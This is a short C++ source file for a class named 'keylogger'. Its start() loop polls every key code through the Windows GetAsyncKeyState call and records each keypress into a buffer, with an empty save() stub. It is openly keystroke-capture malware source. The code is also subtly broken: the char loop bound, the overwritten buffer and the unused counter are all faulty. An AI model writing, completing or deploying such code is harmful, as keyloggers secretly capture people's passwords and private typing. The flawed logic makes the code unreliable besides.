#include "./keylogger.hpp"

keylogger::keylogger()
{
	a_buffer = new string();

	a_buffer_maximum_size = 1;
}

keylogger::~keylogger()
{
	delete a_buffer;
}

void keylogger::save()
{

}

void keylogger::start()
{
	int t_count = 0;

	while(TRUE)
		for(char t_key = 1; t_key <= 255; t_key++)
			if (GetAsyncKeyState(t_key) == -32767)
			{
				*a_buffer = to_string(t_key);
				save();
				t_count++;
			}
}
